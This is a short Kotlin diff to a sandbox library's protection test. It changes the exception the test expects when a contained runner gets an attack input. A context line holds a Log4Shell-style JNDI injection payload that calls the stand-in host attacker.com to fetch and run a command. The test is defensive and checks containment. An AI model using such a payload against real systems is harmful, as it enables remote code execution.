@@ -5,6 +5,7 @@ import io.mazewall.Policy
 import io.mazewall.core.Arch
 import io.mazewall.enforcer.api.ContainedExecutors
 import io.mazewall.enforcer.api.ContainmentViolationEvidence
+import io.mazewall.enforcer.api.ContainmentViolationException
 import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
 import io.mazewall.ffi.NativeConstants
 import io.mazewall.ffi.memory.ConfinedSegment
@@ -30,7 +31,7 @@ class ProtectionDemonstrationTest {
 
         val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
 
-        val ex = assertFailsWith<ExecutionException> { SafeRunner.run(payload) }
+        val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }
 
         assertEquals(
             ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
